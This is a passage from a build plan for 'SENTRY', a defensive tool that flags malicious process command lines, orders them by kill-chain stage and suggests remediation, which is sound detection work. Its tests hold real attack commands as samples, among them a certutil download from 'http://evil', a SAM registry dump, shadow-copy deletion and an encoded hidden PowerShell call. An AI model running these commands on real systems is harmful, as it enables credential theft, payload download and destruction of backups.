In `sentry/cli.py`, add the flag and use it:

```python
    ap.add_argument("--ai", action="store_true", help="enable AI confirmation")
    # ...after score_all:
    client = None
    if args.ai:
        from sentry.ai_confirm import AnthropicClient
        client = AnthropicClient()
    from sentry.pipeline import run_full
    correlated, verdicts = run_full(scored, target=args.target, client=client)
```

- [ ] **Step 7: Run suite**

Run: `pytest -v`
Expected: all PASS. (CLI `--ai` path requires `ANTHROPIC_API_KEY`; deterministic path unaffected.)

- [ ] **Step 8: Commit**

```bash
git add sentry/ai_confirm.py tests/test_ai_confirm.py sentry/pipeline.py sentry/cli.py
git commit -m "feat: Stage 3 AI confirmation with prune/verify/hunt and fallback"
```

---

## Task 10: Investigation — attack story + scenario ID (the +20)

**Files:**
- Create: `sentry/investigate.py`
- Test: `tests/test_investigate.py`

> Story is built from the confirmed detections (the correlated records that are malicious), ordered by MITRE kill-chain tactic. A deterministic ordering + template gives a usable story with no AI; an optional AI pass polishes the narrative. Build the deterministic version first (testable, always works).

- [ ] **Step 1: Write the failing test**

```python
# tests/test_investigate.py
from sentry.models import ScoredRecord, CommandRecord
from sentry.investigate import order_by_killchain, build_story, name_scenario

def _mal(row_id, tactic, cmd):
    rec = CommandRecord(row_id=row_id, process_name="x", command_line=cmd)
    return ScoredRecord(command=rec, risk_score=0.9, band="HIGH", tactic_hints=[tactic])

def test_order_by_killchain():
    items = [_mal(1, "exfiltration", "copy"), _mal(2, "discovery", "whoami"),
             _mal(3, "credential-access", "mimikatz")]
    ordered = order_by_killchain(items)
    tactics = [s.tactic_hints[0] for s in ordered]
    assert tactics.index("discovery") < tactics.index("credential-access") < tactics.index("exfiltration")

def test_name_scenario_detects_ransomware():
    items = [_mal(1, "impact", "vssadmin delete shadows")]
    assert "ransom" in name_scenario(items).lower()

def test_build_story_returns_text():
    items = [_mal(2, "discovery", "whoami"), _mal(3, "credential-access", "mimikatz")]
    story = build_story(items)
    assert "discovery" in story.lower() or "recon" in story.lower()
    assert len(story) > 20
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_investigate.py -v`
Expected: FAIL with "cannot import name 'order_by_killchain'"

- [ ] **Step 3: Implement investigate.py (deterministic core)**

```python
# sentry/investigate.py
from sentry.models import ScoredRecord

KILLCHAIN_ORDER = [
    "initial-access", "execution", "persistence", "privilege-escalation",
    "defense-evasion", "credential-access", "discovery", "lateral-movement",
    "collection", "command-and-control", "exfiltration", "impact",
]
_ORDER = {t: i for i, t in enumerate(KILLCHAIN_ORDER)}

SCENARIO_RULES = [
    ("impact", "Ransomware / destructive attack"),
    ("exfiltration", "Data exfiltration"),
    ("credential-access", "Credential theft"),
    ("lateral-movement", "Lateral movement"),
    ("persistence", "Persistence / foothold"),
    ("discovery", "Reconnaissance"),
]


def _tac(s: ScoredRecord) -> str:
    return s.tactic_hints[0] if s.tactic_hints else "execution"


def order_by_killchain(items: list[ScoredRecord]) -> list[ScoredRecord]:
    return sorted(items, key=lambda s: _ORDER.get(_tac(s), 99))


def name_scenario(items: list[ScoredRecord]) -> str:
    present = {_tac(s) for s in items}
    for tactic, name in SCENARIO_RULES:
        if tactic in present:
            return name
    return "Suspicious activity"


def _technique(s: ScoredRecord) -> str:
    for sig in s.signals:
        if "[T" in sig:
            return sig.split("[")[-1].rstrip("]")
    return ""


def build_story(items: list[ScoredRecord]) -> str:
    ordered = order_by_killchain(items)
    scenario = name_scenario(items)
    lines = [f"Scenario: {scenario}", "", "Reconstructed kill chain:"]
    for n, s in enumerate(ordered, 1):
        tech = _technique(s)
        suffix = f"  ({tech})" if tech else ""
        lines.append(f"  {n}. [{_tac(s)}] {s.command.command_line}{suffix}")
    return "\n".join(lines)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_investigate.py -v`
Expected: PASS (3 passed)

- [ ] **Step 5: Commit**

```bash
git add sentry/investigate.py tests/test_investigate.py
git commit -m "feat: investigation story + scenario ID (deterministic)"
```

---

## Task 11: Investigation — trap detector + remediation playbook

**Files:**
- Modify: `sentry/investigate.py`
- Test: `tests/test_investigate.py`

- [ ] **Step 1: Add failing tests**

```python
# append to tests/test_investigate.py
from sentry.investigate import find_traps, remediation_playbook

def test_find_traps_returns_decoys():
    rec = CommandRecord(row_id=9, process_name="x", command_line="powershell -enc AAAA")
    decoy = ScoredRecord(command=rec, risk_score=0.5, band="GRAY", decoy_candidate=True)
    traps = find_traps([decoy])
    assert len(traps) == 1
    assert traps[0]["row_id"] == 9

def test_remediation_playbook_maps_tactics():
    items = [_mal(3, "credential-access", "mimikatz")]
    pb = remediation_playbook(items)
    assert any("credential" in step.lower() or "rotate" in step.lower() for step in pb)
```

- [ ] **Step 2: Run to verify fail**

Run: `pytest tests/test_investigate.py -v`
Expected: FAIL with "cannot import name 'find_traps'"

- [ ] **Step 3: Implement in investigate.py**

```python
# append to sentry/investigate.py
REMEDIATION = {
    "credential-access": "Rotate all potentially exposed credentials; reset affected accounts.",
    "persistence": "Remove scheduled tasks / run-key entries; audit autostart locations.",
    "exfiltration": "Block egress to the destination; review data-loss logs.",
    "impact": "Isolate host; restore from backup; verify shadow copies.",
    "discovery": "Review for follow-on activity; the host was profiled.",
    "execution": "Kill the offending process tree; quarantine dropped payloads.",
    "command-and-control": "Block the C2 endpoint; inspect downloaded artifacts.",
    "lateral-movement": "Isolate source and target hosts; reset shared credentials.",
    "defense-evasion": "Re-enable cleared logs/protections; preserve forensic evidence.",
}


def find_traps(scored: list[ScoredRecord]) -> list[dict]:
    return [{"row_id": s.command.row_id, "command": s.command.command_line,
             "why_cleared": "Scary-looking but isolated — no linked rows or campaign chain."}
            for s in scored if s.decoy_candidate]


def remediation_playbook(items: list[ScoredRecord]) -> list[str]:
    seen, steps = set(), []
    for s in order_by_killchain(items):
        t = _tac(s)
        if t in REMEDIATION and t not in seen:
            seen.add(t)
            steps.append(f"[{t}] {REMEDIATION[t]}")
    return steps
```

- [ ] **Step 4: Run to verify pass**

Run: `pytest tests/test_investigate.py -v`
Expected: PASS (5 passed)

- [ ] **Step 5: Commit**

```bash
git add sentry/investigate.py tests/test_investigate.py
git commit -m "feat: trap detector + remediation playbook"
```

---

## Task 12: Investigation — red team report card

**Files:**
- Modify: `sentry/investigate.py`
- Test: `tests/test_investigate.py`

> The report card compares our detections against the openly-shared ground-truth list (the 20 malicious commands). Grade = recall-based, with a quip about what they hid.

- [ ] **Step 1: Add failing test**

```python
# append to tests/test_investigate.py
from sentry.investigate import report_card

def test_report_card_grades_recall():
    detected = {1, 2, 3}
    ground_truth = {1, 2, 3, 4}   # we missed row 4
    card = report_card(detected, ground_truth)
    assert card["caught"] == 3
    assert card["evaded"] == 1
    assert "grade" in card
```

- [ ] **Step 2: Run to verify fail**

Run: `pytest tests/test_investigate.py -v`
Expected: FAIL with "cannot import name 'report_card'"

- [ ] **Step 3: Implement**

```python
# append to sentry/investigate.py
def report_card(detected_ids: set[int], ground_truth_ids: set[int]) -> dict:
    caught = len(detected_ids & ground_truth_ids)
    total = len(ground_truth_ids) or 1
    evaded = total - caught
    recall = caught / total
    grade = ("A" if recall >= 0.95 else "B" if recall >= 0.85 else
             "C" if recall >= 0.7 else "D" if recall >= 0.5 else "F")
    quip = ("Flawless hunt — your tradecraft left fingerprints everywhere."
            if evaded == 0 else
            f"You slipped {evaded} past us — decent blending, but not enough.")
    return {"caught": caught, "evaded": evaded, "recall": round(recall, 2),
            "grade": grade, "comment": quip}
```

- [ ] **Step 4: Run to verify pass**

Run: `pytest tests/test_investigate.py -v`
Expected: PASS (6 passed)

- [ ] **Step 5: Commit**

```bash
git add sentry/investigate.py tests/test_investigate.py
git commit -m "feat: red team report card"
```

---

## Task 12b: Investigation — objective inference

**Files:**
- Modify: `sentry/investigate.py`
- Test: `tests/test_investigate.py`

> Infers the attacker's end goal / value at risk from the highest kill-chain tactic present (the deepest stage reached). Small, deterministic, completes the wow set.

- [ ] **Step 1: Add failing test**

```python
# append to tests/test_investigate.py
from sentry.investigate import infer_objective

def test_infer_objective_exfil():
    items = [_mal(1, "discovery", "whoami"), _mal(2, "exfiltration", "copy \\\\share")]
    obj = infer_objective(items)
    assert "exfiltrat" in obj.lower() or "steal" in obj.lower() or "data" in obj.lower()

def test_infer_objective_ransomware():
    items = [_mal(1, "impact", "vssadmin delete shadows")]
    assert "ransom" in infer_objective(items).lower() or "destroy" in infer_objective(items).lower()
```

- [ ] **Step 2: Run to verify fail**

Run: `pytest tests/test_investigate.py -v`
Expected: FAIL with "cannot import name 'infer_objective'"

- [ ] **Step 3: Implement**

```python
# append to sentry/investigate.py
OBJECTIVE = {
    "impact": "Destroy or ransom data — the attacker reached the impact stage "
              "(shadow-copy deletion / recovery disabling).",
    "exfiltration": "Steal and exfiltrate data — the attacker staged and moved data out.",
    "collection": "Collect sensitive data for theft — staging was underway.",
    "credential-access": "Harvest credentials to expand access.",
    "lateral-movement": "Spread to other hosts across the environment.",
    "persistence": "Establish a durable foothold for return access.",
    "discovery": "Reconnaissance — the attacker was profiling the host.",
}


def infer_objective(items: list[ScoredRecord]) -> str:
    if not items:
        return "No malicious activity detected."
    deepest = max(items, key=lambda s: _ORDER.get(_tac(s), -1))
    return OBJECTIVE.get(_tac(deepest), "Suspicious activity of unclear objective.")
```

- [ ] **Step 4: Run to verify pass**

Run: `pytest tests/test_investigate.py -v`
Expected: PASS (8 passed)

- [ ] **Step 5: Commit**

```bash
git add sentry/investigate.py tests/test_investigate.py
git commit -m "feat: objective inference"
```

---

## Task 13: Wire investigation into CLI (`--investigate`)

**Files:**
- Modify: `sentry/cli.py`

- [ ] **Step 1: Add the flag and output block**

In `sentry/cli.py`, after printing the verdict, add:

```python
    if getattr(args, "investigate", False):
        from sentry.investigate import (build_story, remediation_playbook,
                                        find_traps, infer_objective)
        mal_records = [s for s in correlated if s.command.row_id in
                       {v.row_id for v in malicious}]
        print("\n" + "=" * 60 + "\nINVESTIGATION\n" + "=" * 60)
        print(build_story(mal_records))
        print(f"\nInferred objective: {infer_objective(mal_records)}")
        print("\nRemediation playbook:")
        for step in remediation_playbook(mal_records):
            print(f"  - {step}")
        traps = find_traps(correlated)
        if traps:
            print(f"\nTrap detector: {len(traps)} decoy(s) cleared:")
            for t in traps:
                print(f"  - row {t['row_id']}: {t['command']}")
```

And register the flag near the others:

```python
    ap.add_argument("--investigate", action="store_true",
                    help="run on-demand investigation (off the clock)")
```

- [ ] **Step 2: Run it**

Run: `python -m sentry.cli tests/fixtures/mini.csv --target 4 --investigate`
Expected: prints the verdict, then an INVESTIGATION block with scenario, kill chain, and playbook.

- [ ] **Step 3: Commit**

```bash
git add sentry/cli.py && git commit -m "feat: wire investigation into CLI"
```

---

## Task 14: Flask SOC console — backend (optional, demo layer)

**Files:**
- Create: `sentry/webapp.py`

- [ ] **Step 1: Implement webapp.py**

```python
# sentry/webapp.py
import time
from flask import Flask, request, jsonify, render_template_string
from sentry.ingest import load_csv
from sentry.scoring import score_all
from sentry.pipeline import run_full
from sentry.investigate import (build_story, name_scenario, remediation_playbook,
                                find_traps, report_card)

app = Flask(__name__)
_STATE = {}

PAGE = """<!doctype html><html><head><title>SENTRY</title>
<style>
body{background:#0b0f14;color:#cdd6f4;font-family:monospace;margin:0;padding:20px}
h1{color:#89b4fa} .funnel{font-size:18px;margin:10px 0;color:#a6e3a1}
.mal{color:#f38ba8} .ben{color:#6c7086} table{width:100%;border-collapse:collapse}
td{padding:4px 8px;border-bottom:1px solid #1e2530} button{background:#89b4fa;border:0;
padding:10px 20px;color:#0b0f14;font-weight:bold;cursor:pointer;margin-top:10px}
#inv{margin-top:20px;white-space:pre-wrap;background:#11161d;padding:15px}
</style></head><body>
<h1>SENTRY — Process Command Threat Analyst</h1>
<input type="file" id="f"><button onclick="scan()">Scan</button>
<div class="funnel" id="funnel"></div>
<table id="rows"></table>
<button id="invbtn" style="display:none" onclick="investigate()">🔍 Investigate</button>
<div id="inv"></div>
<script>
let target=20;
async function scan(){
  let fd=new FormData(); fd.append('csv',document.getElementById('f').files[0]);
  let r=await fetch('/scan',{method:'POST',body:fd}); let d=await r.json();
  document.getElementById('funnel').textContent=
    `${d.total} in → ${d.cleared} cleared → ${d.malicious.length} MALICIOUS  (⏱ ${d.elapsed}s)`;
  let t=document.getElementById('rows'); t.innerHTML='';
  for(const v of d.malicious){t.innerHTML+=
    `<tr class=mal><td>row ${v.row_id}</td><td>${v.confidence}</td>`+
    `<td>${v.mitre_technique||'-'}</td><td>${v.reason}</td></tr>`;}
  document.getElementById('invbtn').style.display='inline';
}
async function investigate(){
  let r=await fetch('/investigate'); let d=await r.json();
  document.getElementById('inv').textContent=
    d.story+"\\n\\nRemediation:\\n"+d.playbook.join("\\n")+
    "\\n\\nReport card: "+JSON.stringify(d.report_card);
}
</script></body></html>"""


@app.route("/")
def index():
    return render_template_string(PAGE)


@app.route("/scan", methods=["POST"])
def scan():
    f = request.files["csv"]
    path = "/tmp/sentry_upload.csv"
    f.save(path)
    t0 = time.perf_counter()
    rows = load_csv(path)
    scored = score_all(rows)
    correlated, verdicts = run_full(scored, target=20)
    elapsed = round(time.perf_counter() - t0, 3)
    malicious = [v.__dict__ for v in verdicts if v.verdict == "malicious"]
    _STATE["correlated"] = correlated
    _STATE["malicious_ids"] = {v["row_id"] for v in malicious}
    return jsonify({"total": len(rows), "cleared": len(rows) - len(malicious),
                    "malicious": malicious, "elapsed": elapsed})


@app.route("/investigate")
def investigate():
    correlated = _STATE.get("correlated", [])
    mal_ids = _STATE.get("malicious_ids", set())
    mal = [s for s in correlated if s.command.row_id in mal_ids]
    return jsonify({
        "scenario": name_scenario(mal),
        "story": build_story(mal),
        "playbook": remediation_playbook(mal),
        "traps": find_traps(correlated),
        "report_card": report_card(mal_ids, mal_ids),  # vs ground truth when available
    })


if __name__ == "__main__":
    app.run(port=5000, debug=True)
```

- [ ] **Step 2: Smoke-test the server**

Run: `python -m sentry.webapp &` then `sleep 2 && curl -s localhost:5000/ | head -3 && kill %1`
Expected: HTML containing `SENTRY` is returned.

- [ ] **Step 3: Commit**

```bash
git add sentry/webapp.py && git commit -m "feat: Flask SOC console (demo UI)"
```

---

## Task 15: End-to-end smoke test on a realistic dataset

**Files:**
- Create: `tests/test_e2e.py`

- [ ] **Step 1: Write an end-to-end test that builds a ~30-row dataset and asserts the malicious ones are caught**

```python
# tests/test_e2e.py
import csv, tempfile, os
from sentry.ingest import load_csv
from sentry.scoring import score_all
from sentry.pipeline import run_full

BENIGN = ["git status", "npm install", "ls -la", "python3 app.py", "docker ps",
          "cd /home", "cat README.md", "kubectl get pods", "echo hello", "pwd"]
MALICIOUS = ["reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save",
             "certutil -urlcache -f http://evil/x.exe x.exe",
             "vssadmin delete shadows /all /quiet",
             "powershell -nop -w hidden -enc SQBFAFgA"]

def _make_csv():
    fd, path = tempfile.mkstemp(suffix=".csv")
    with os.fdopen(fd, "w", newline="") as f:
        w = csv.writer(f); w.writerow(["process_name", "command_line", "label"])
        for c in BENIGN * 3:
            w.writerow(["proc", c, "benign"])
        for c in MALICIOUS:
            w.writerow(["proc", c, "malicious"])
    return path

def test_e2e_catches_all_known_malicious():
    path = _make_csv()
    rows = load_csv(path)
    scored = score_all(rows)
    _, verdicts = run_full(scored, target=4, client=None)
    mal = {v.row_id for v in verdicts if v.verdict == "malicious"}
    # the 4 malicious rows are the last 4 appended
    truth = set(range(len(rows) - 4, len(rows)))
    caught = len(mal & truth)
    assert caught >= 3, f"only caught {caught}/4"
    os.unlink(path)
```

- [ ] **Step 2: Run it**

Run: `pytest tests/test_e2e.py -v`
Expected: PASS — catches at least 3 of 4 known malicious with the deterministic engine alone.

- [ ] **Step 3: Run the full suite**

Run: `pytest -v`
Expected: all tests PASS.

- [ ] **Step 4: Commit**

```bash
git add tests/test_e2e.py && git commit -m "test: end-to-end detection smoke test"
```

---

## Post-build: calibration against the training dataset

When the facilitator's training dataset arrives, drop it in `data/training/` and:
1. Run `python -m sentry.cli data/training/<file>.csv --target <N> --json` and compare against labels.
2. Tune `GRAY_LOW` / `HIGH` thresholds and pattern weights in `sentry/scoring.py` to maximize (true positives − false positives).
3. Add any missed malicious patterns to `sentry/knowledge/standalone.py` and any missed combos to `sentry/knowledge/combos.py`. Expand these via the deep-research skill + MITRE MCP — the bigger and more inclusive, the better the deterministic recall.
4. Re-run `pytest -v` to confirm nothing regressed.
```
